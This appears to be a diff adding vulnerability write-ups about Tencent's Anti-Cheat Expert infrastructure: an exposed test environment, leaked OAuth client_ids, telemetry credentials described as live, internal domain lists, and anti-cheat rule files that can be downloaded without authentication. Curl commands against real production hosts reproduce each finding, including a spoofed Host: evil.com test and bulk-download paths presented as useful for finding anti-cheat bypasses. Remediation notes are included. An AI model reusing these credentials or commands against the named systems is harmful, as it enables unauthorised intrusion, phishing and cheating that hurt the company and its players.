+- Internal integration documentation exposed to unauthenticated users
+- API test data in Excel file may contain endpoint specifications, test credentials, or internal URLs
+- Doc-center pages (Vue SSR) may contain technical details about ACE integration not meant for public access
+- Directory structure (`/docs/ACE-files/ugc_access/`) hints at other potential paths to enumerate
+
+## Remediation
+
+- Gate all `/docs/` and `/doc-center/` paths behind authentication
+- Review all files in `/docs/ACE-files/` for sensitive content
+
+```
+
+`vulnerabilities/07_test_env_exposed.md`:
+
+```md
+# ACE-2024-07: Test Environment Publicly Accessible
+
+**Severity:** HIGH
+**Status:** Confirmed
+**Date:** 2026-09-02
+
+## Host
+
+```
+https://test.intl.anticheatexpert.com
+```
+
+Server: istio-envoy (same as prod)
+Build: `cloud_100260_test/2608201250` (vs prod `cloud_100260_oper/2608211122`)
+
+## Findings
+
+### /cgi/doc processes without auth
+
+```bash
+curl -sk -X POST https://test.intl.anticheatexpert.com/cgi/doc \
+  -H "Content-Type: application/json" \
+  -d '{"page_type":1}'
+# Returns: {"info":"para unlegal","ret":-1}  (400, NOT 401)
+```
+
+On production, the same endpoint returns **401** without auth. On test, the request reaches the backend handler (returns application-level error, not auth error).
+
+### puv_record fixed on test first
+
+`ibox_2592/cgi/puv_record` returns **401** on test (properly auth-gated), but was still open on prod (now 500). This suggests they patched test first, then prod broke.
+
+### All ibox services down on test too
+
+Every ibox_* CGI endpoint returns 500 on test — same infrastructure-level gateway outage.
+
+## Additional Hosts Discovered
+
+| Host | Server | Role |
+|------|--------|------|
+| `test.intl.anticheatexpert.com` | istio-envoy | Test environment |
+| `login.auth.sgp.anticheatexpert.com` | nginx/1.18.0 Ubuntu | Auth login center (stale build Jul 2025) |
+| `m.intl.anticheatexpert.com` | nginx/1.10.3 | Mobile site |
+
+## Impact
+
+- Test environments often have weaker WAF rules, debug features enabled, or stale security patches
+- `/cgi/doc` auth bypass on test confirms inconsistent security controls between environments
+- Test build identifier leaks deployment schedule
+
+## Remediation
+
+- Restrict test environment to internal network or VPN
+- Ensure auth middleware is consistent between test and prod
+
+```
+
+`vulnerabilities/08_oauth_config_leak.md`:
+
+```md
+# ACE-2024-08: OAuth Configuration & Internal Domain Exposure
+
+**Severity:** HIGH
+**Status:** Confirmed
+**Date:** 2026-09-01 / 2026-09-02
+
+## Leaked OAuth Configuration (from JS bundles)
+
+| Parameter | Value | Source |
+|-----------|-------|--------|
+| QQ OAuth appId | `101531192` | Console JS |
+| QQ callback | `https://mtp.qq.com/ibox_1914/cgi/qqcallback` | Console JS |
+| Gongfeng client_id (prod) | `d15f1aada3db4be2be622afed0019a29` | ibox_2262 JS |
+| Gongfeng client_id (test) | `3c457707400c4e6c98f019536c9ad2d7` | ibox_2262 JS |
+| WeCom redirect | `intl.anticheatexpert.com/ibox_1914/cgi/weworkcallback` | Console JS |
+| Login center origin | `http://login.auth.ace.woa.com` (HTTP!) | login.auth.sgp JS |
+
+## Leaked Internal Domains (allowed-origin.json)
+
+```
+lego2bbeta.woa.com       — internal low-code platform (beta)
+lego2b.woa.com           — internal low-code platform
+devops.woa.com           — Tencent DevOps
+zhiyan.woa.com           — monitoring platform
+expt.woa.com             — experiment platform
+hlego.woa.com            — lego variant
+codecraft.weixin.woa.com — WeChat dev tools
+lite-playground.weixin.woa.com — WeChat playground
+gongfeng-copilot-monaco.pages.woa.com — Copilot pages
+cms.video.cloud.cctv.com — CCTV CMS (HTTP, not HTTPS!)
+```
+
+## Reproduction
+
+```bash
+# OAuth allowed origins
+curl -sk https://assets.code.tencent.com/common/oauth/allowed-origin.json
+
+# QQ appId in console JS
+curl -sk https://intl.anticheatexpert.com/cloud_100135_oper/2609011453/js/app.js 2>/dev/null | grep -o '101531192'
+```
+
+## Impact
+
+- OAuth client_ids enable targeted OAuth phishing
+- Internal domain inventory aids further reconnaissance
+- `loginCenter.origin` over HTTP enables MITM on internal auth
+- CCTV CMS in allowlist over HTTP — downgrade attack vector
+
+## Remediation
+
+- Move OAuth configuration to server-side
+- Remove `allowed-origin.json` from public CDN
+- Enforce HTTPS for all OAuth origins (especially `cms.video.cloud.cctv.com` and `login.auth.ace.woa.com`)
+
+```
+
+`vulnerabilities/09_codebuddy_exposure.md`:
+
+```md
+# ACE-2024-09: Tencent CodeBuddy AI Copilot Internal Build Exposure
+
+**Severity:** HIGH
+**Status:** Confirmed
+**Date:** 2026-09-02
+
+## Vulnerable Asset
+
+```
+https://assets.aicode.tencent.com/gongfeng-copilot-monaco/latest/index.js
+```
+
+Size: 3.5 MB, Version: 2.16.1 (CodeBuddy Internal Edition)
+
+## Leaked Credentials & Configuration
+
+| Item | Value |
+|------|-------|
+| Telemetry attaid | `00400014144` |
+| Telemetry token | `6478159937` |
+| secretKey | `gongfeng.auth` (keychain identifier) |
+| copilotSecretKey | `gongfeng.copilot.auth` (keychain identifier) |
+
+Telemetry tokens verified live:
+```bash
+curl -sk "https://h.trace.qq.com/kv?attaid=00400014144&token=6478159937"
+# Returns 200 (write-only sink, but proves tokens are valid)
+```
+
+## Leaked Internal Domains (12)
+
+```
+copilot.code.woa.com           — AI Copilot API
+test-copilot.code.woa.com      — Copilot test instance
+copilotflow.woa.com            — Copilot workflow service
+git.woa.com                    — Gongfeng GitLab
+ut-service-ty.tapd.woa.com     — TAPD unit test service
+km.woa.com                     — Knowledge management
+iwiki.woa.com                  — Internal wiki
+knot.woa.com                   — Feature flag service (reachable! 403)
+test.knot.woa.com              — Feature flag test (reachable! 403)
+```
+
+## Version History (all publicly accessible)
+
+```bash
+curl -sk https://assets.aicode.tencent.com/gongfeng-copilot-monaco/2.13.0/index.js -o /dev/null -w "%{http_code}"  # 200
+curl -sk https://assets.aicode.tencent.com/gongfeng-copilot-monaco/2.14.0/index.js -o /dev/null -w "%{http_code}"  # 200
+curl -sk https://assets.aicode.tencent.com/gongfeng-copilot-monaco/2.15.0/index.js -o /dev/null -w "%{http_code}"  # 200
+curl -sk https://assets.aicode.tencent.com/gongfeng-copilot-monaco/latest/index.js -o /dev/null -w "%{http_code}"  # 200
+```
+
+## CI/CD Exposure
+
+`external-context.json` contains BK-CI (BlueKing CI) shell snippets for the build pipeline.
+
+## Impact
+
+- Internal AI Copilot build publicly accessible — can be reverse-engineered for API protocol
+- Telemetry credentials allow injecting fake telemetry events
+- Internal domain inventory aids targeted phishing or lateral movement
+- Feature flag service (knot.woa.com) externally reachable (behind iOA VPN gate)
+- Version history enables diffing to find newly added features/endpoints
+
+## Remediation
+
+- Restrict `assets.aicode.tencent.com/gongfeng-copilot-monaco/` to authenticated access
+- Remove telemetry credentials from client-side bundles
+- Strip internal domain references from production builds
+
+```
+
+`vulnerabilities/10_cdn_no_auth.md`:
+
+```md
+# ACE-2024-10: CDN Anti-Cheat Files Accessible Without Authentication
+
+**Severity:** HIGH
+**Status:** Confirmed
+**Date:** 2026-09-01
+
+## Vulnerability
+
+All CDN-delivered anti-cheat rule files, VM images, configs, and scripts are downloadable without any authentication, token, or rate limiting.
+
+## URL Pattern
+
+```
+https://dl.listdl.com/iedsafe/Client/{platform}/{channel}/{hash_A}/{filename}
+```
+
+Where:
+- `platform`: `ios`, `android`, `win`
+- `channel`: SDK version ID (e.g., 2139 = PUBG Global)
+- `hash_A`: CRC32-based hash from `config2.xml` manifest
+- `filename`: rule file name
+
+## Scale
+
+| Platform | Channels | Unique Files | Notes |
+|----------|----------|-------------|-------|
+| iOS | 36 | ~200 | mrpcs, ob_x.zip, comm.dat |
+| Android | 36+ | ~250 | All iOS types + ob_cdn1.zip, gs1.cdc scripts |
+| Windows | 7 | ~30 | ob_x_ver_86.zip, ob_cs2_86.zip, comm.zip |
+| **Total** | | **~456 unique** | |
+
+## File Types
+
+| Filename | Type | Description |
+|----------|------|-------------|
+| `mrpcs_i.data` | OBJVM rules | Initial rule set (XOR 0x46) |
+| `mrpcs.data` / `mrpcsZ_cp.data` | OBJVM rules | Full/cross-platform rules |
+| `mrpcsZ_dp.data` | OBJVM rules | **New type** (unknown suffix) |
+| `mrpcs-cs-*-ios.data` | OBJVM rules | Channel-specific rules |
+| `ob_x.zip` | OBJVM images | Detection VM bytecode (a64.dat) |
+| `ob_cs2.zip` | OBJVM images | CS2-specific detection module |
+| `ob_cdn1.zip` | OBJVM images | Android-only (a32.dat + a64.dat) |
+| `ob_x_ver_86.zip` | OBJVM images | **Windows x86** detection module |
+| `comm.dat` / `comm.zip` | Config | Feature flags (TLV format) |
+| `tssmua.zip` | Module | Security module update |
+| `pubgm_script_id_28.gs1.cdc` | **Python bytecode** | Process scanner script (new format) |
+
+## Reproduction
+
+```bash
+# Get manifest for PUBG Global iOS
+curl -sk "https://dl.listdl.com/iedsafe/Client/ios/2139/config2.xml"
+
+# Download a specific rule file (hash from manifest)
+curl -sk "https://dl.listdl.com/iedsafe/Client/ios/2139/{hash_A}/mrpcs_i.data" -o mrpcs_i.data
+
+# Windows detection module
+curl -sk "https://dl.listdl.com/iedsafe/Client/win/2139/{hash_A}/ob_x_ver_86.zip" -o ob_x_win.zip
+```
+
+## 36 Known iOS Channels
+
+PUBG Global (2139), PUBG CN (2131), PUBG VN (2202), PUBG KR/JP (6139), PUBG TW (2244), CODM Global (2257), CODM CN (2152), CODM Garena (2292), CODM KR (2297), CODM VN (2352), Arena Breakout (2487), Honor of Kings CN (2577), HoK Global (2915), Arena of Valor Global (2919), AoV VN (2920), Delta Force Global (10039), and 20 others.
+
+## Impact
+
+- Anti-cheat detection rules can be analyzed offline to find bypass methods
+- VM bytecode can be decompiled to understand detection logic
+- Config files reveal feature flags and scan schedules
+- Process scanner scripts reveal exactly what is being detected
+- No rate limiting enables bulk downloading of all rules across all games
+- Rule updates can be monitored in real-time
+
+## Remediation
+
+- Implement per-device token authentication for CDN file downloads
+- Add rate limiting to prevent bulk enumeration
+- Consider encrypting rule files with per-device keys
+
+```
+
+`vulnerabilities/medium/README.md`:
+
+```md
+# Medium Severity Findings
+
+| ID | Finding | Detail | Status |
+|----|---------|--------|--------|
+| M-01 | **No-auth game_id enumeration** | `POST /ibox_2592/cgi/puv_record` accepted `game_id` without cookies. 484 live game IDs found. Now returns 500 (patched or gateway down). | Was confirmed, now blocked |
+| M-02 | **Host header validation missing** | Any non-matching `Host:` header → HTTP 200 empty response on all paths. Default vhost in istio-envoy doesn't reject unknown hosts. Enables cache poisoning if CDN sits in front. | Confirmed |
+| M-03 | **COS versioning & replication metadata** | `/docs/` and `/docs/admin/` return `x-cos-version-id` and `x-cos-replication-status: Replica`. Reveals bucket has versioning enabled and cross-region replication is active. | Confirmed |
+| M-04 | **Swagger/API docs behind auth** | `/api-docs` returns 401 (not 404) on both prod and test. API documentation service exists — accessible with any authenticated session. | Confirmed |
+| M-05 | **WebSocket endpoints** | `/api/ws` and `/cgi/ws` return 401. Real-time endpoints exist behind auth. | Confirmed |
+| M-06 | **SSRF-capable endpoint (dormant)** | `lower_code_interface_call` on ibox_2084, 2279, 2913 accepts `{url, method, header, para}` — full HTTP proxy. All currently 500. When gateway recovers, this is direct SSRF. | Confirmed (code exists), blocked by gateway |
+| M-07 | **Rate limit CRUD endpoints** | ibox_2136 has `auth/api/rate_limit/rule/{create,delete,query,update}`. If accessible, could disable rate limiting for other services. | Discovered, untested (500) |
+| M-08 | **login.auth.sgp stale deployment** | Build `100047_oper/2507151708` (Jul 15, 2025). nginx/1.18.0 Ubuntu. `__env: "{{ENV}}"` template not rendered. Over 1 year without updates. | Confirmed |
+| M-09 | **Expired TLS certificate** | `*.oa.com` cert expired Aug 17, 2026. GoDaddy-issued. Affects `app.ibox.oa.com`, `appgz.ibox.oa.com`. | Confirmed |
+| M-10 | **`/_logout/?url=` parameter** | On login.auth.sgp, accepts URL param with server-side validation (403 for external, 404 for internal). Not an open redirect, but validation logic is visible. | Confirmed, not exploitable |
+
+## Verification Commands
+
+```bash
+# M-01: game_id enum (currently 500)
+curl -sk -X POST https://intl.anticheatexpert.com/ibox_2592/cgi/puv_record \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Ibox-Request-Trace: bw==" -d "game_id=24011"
+
+# M-02: Host header
+curl -sk -H "Host: evil.com" https://intl.anticheatexpert.com/nonexistent
+
+# M-04: API docs
+curl -sk -o /dev/null -w "%{http_code}" https://intl.anticheatexpert.com/api-docs
+
+# M-05: WebSocket
+curl -sk -o /dev/null -w "%{http_code}" https://intl.anticheatexpert.com/api/ws
+
+# M-09: Expired cert
+curl -sv https://app.ibox.oa.com/ 2>&1 | grep "expire date"
+```
+
+```
